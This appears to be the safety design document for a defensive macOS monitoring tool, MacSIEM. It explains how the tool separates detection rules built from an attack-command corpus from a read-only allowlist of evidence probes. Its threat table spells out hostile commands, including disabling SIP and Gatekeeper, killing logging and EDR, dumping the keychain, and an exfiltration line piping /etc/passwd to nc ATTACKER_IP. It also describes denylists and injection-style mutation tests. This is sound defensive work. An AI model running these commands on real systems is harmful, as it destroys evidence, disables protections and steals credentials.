# Safety

MacSIEM is built from a catalogue of macOS attack commands. This document is the
argument that it cannot be used as one.

## The problem

The LOOBins corpus documents 183 adversary techniques. Roughly 40 of them are
destructive or disable security controls. An automated defensive tool that
"runs the listed commands to collect evidence" would, in one sweep:

| Command | Effect |
| --- | --- |
| `log erase --all` | delete the entire unified log store |
| `csrutil disable` | turn off System Integrity Protection |
| `spctl --master-disable` | turn off Gatekeeper |
| `tccutil reset AppleEvents` | wipe the user's privacy consent decisions |
| `sfltool resetbtm` | reset Background Task Management — destroying persistence evidence |
| `lsregister -delete` | destroy the Launch Services database |
| `tmutil delete` / `tmutil disable` | delete backups, stop backing up |
| `pkill -f "syslog\|auditd\|osqueryd\|esensor\|nessusd"` | kill logging and EDR |
| `security dump-keychain -d` | dump every stored credential |
| `security add-trusted-cert -d -r trustRoot` | install a root CA |
| `networksetup -setwebproxy` | redirect all traffic through a proxy |
| `sysadminctl -deleteUser` / `-resetPasswordFor` | delete accounts, destroy keychain access |
| `xattr -d -r com.apple.quarantine *` | strip quarantine recursively |
| `dd if=/etc/passwd \| streamzip - \| nc ATTACKER_IP PORT` | live exfiltration |
| `while true; do screencapture ...; done` | a surveillance loop that never exits |

Several corpus entries also chain commands, so partial execution is still
destructive.

## The split

The corpus is divided at the build boundary and the halves never meet.

**Detection patterns.** `tools/build_rulepack.py` compiles every `code` string
into a structured argv pattern — required flags, positional constraints, token
anchors — plus tactics, tags and a SHA-256 of the source string. The shipped
`rulepack.json` contains **no executable command strings**. `tests/test_safety.py`
asserts there is no `code`/`cmd`/`command`/`script` field anywhere in it, and that
no destructive corpus fragment appears in any probe argv.

**Evidence probes.** `macsiem/evidence/probes.py` is a separate, hand-written
catalog of 92 read-only probes. It is the complete allowlist of everything
MacSIEM may run.

## Five layers

**1. Structural.** `macsiem/util/proc.py` is the only module permitted to import
`subprocess`. It accepts an argv *list* and rejects a command string outright.
There is no `shell=True` in the codebase. Enforced by AST analysis in
`tests/test_safety.py`, which also bans `os.system`, `os.popen`, `os.exec*`,
`eval`, `exec` and `pty`.

**2. Allowlist.** Only probes in the catalog execute. The orchestrator takes
probe *ids*, never argv from a caller, so a field from an event can never become
a command. The session agent enforces the same rule across its socket: only
probe ids cross it, and only session-scoped ones are accepted.

**3. Denylist (`macsiem/evidence/safety.py`).** Validated three times — at
import, at daemon start, and on the substituted argv immediately before spawn:

- `argv[0]` must be absolute and under `/bin`, `/sbin`, `/usr/bin`, `/usr/sbin`,
  `/usr/libexec`, `/System/Library` or `/System/Cryptexes`
- a global denylist of mutating tokens (`disable`, `erase`, `delete`, `reset`,
  `load`, `write`, `create`, `dump-keychain`, `--master-disable`, `-setwebproxy`,
  `resetbtm`, …)
- assignment-shaped flags (`^--?set…`, `^--?(add|del|new)…`, `--force`)
- per-binary read-only **verb allowlists** written from the man pages, not
  generated from the catalog, so they are an independent second opinion
- per-binary mutating **flag** denial, because short flags are ambiguous: `-c`
  clears attributes for `xattr`, selects a class for `ioreg`, and reads a plist
  for `nvram`
- no shell metacharacters in any argv element

**4. Corpus firewall.** There is no code path from a rulepack entry to
`proc.run`. Rules carry the SHA-256 of the source command, never the command.

**5. Containment of the one writing probe.** Exactly one probe writes a file:
the opt-in screenshot. Its destination must be the `{artifact}` slot (a literal
path is refused statically), and at runtime the resolved path must be inside the
bundle directory — symlink traversal included. A test asserts no second writing
probe has been added.

## Declared exceptions

Three arguments in the entire product are free-form: two unified-log predicates
and one Spotlight query. Each is listed **by exact value** in
`safety._EXEMPT_ELEMENTS`, must pass a purpose-built validator, and the probe
must carry a written justification. A test asserts each exempt string actually
appears in the probe claiming it, so the exemption list cannot drift.

## Mutation testing

The guard is tested rather than trusted. `tests/test_safety.py` applies 16
hostile mutations to all 67 exec probes — appending `disable`, swapping in
`erase`, injecting `;` / `$()` / pipes / backticks / newlines, repointing
`argv[0]` into `/tmp`, adding redirects and `--force`, making the path relative,
substituting `tccutil reset`, poisoning the log predicate, pointing the artifact
at `/etc/passwd` — and asserts **all 1072 are rejected**. CI fails on a single
escape.

## Fail-closed

A validation failure is never a warning. `macsiem daemon` refuses to start and
exits; the CLI exits 78 (`EX_CONFIG`); `macsiem doctor` prints exactly which
probe failed and why.

## Evidence integrity — and its limits

The event store and each bundle manifest are hash-chained:

```
chain_hash[n] = sha256(chain_hash[n-1] || canonical_json(record[n]))
```

with a genesis bound to the host identity and an install nonce, so chains from
different Macs cannot be spliced. Modification breaks the hash; deletion breaks
the sequence. Artifacts are folded into a Merkle root so one artifact can be
verified or redacted without invalidating the others. The manifest records the
store's chain head and the store records the sealed bundle's hash.

**What this does not do.** Root at time-of-write can recompute a consistent
chain. This construction detects non-root tampering, post-hoc edits, offline
modification of an exported bundle, and truncation. It is not remote
attestation. For tamper-*proofing*, forward events off the host — the forwarders
exist for exactly that reason.

## Not implemented, deliberately

No response actions. MacSIEM does not quarantine files, kill processes, unload
LaunchAgents or change any setting. Adding that would give it the capability set
this document exists to deny. It observes, records and proves.
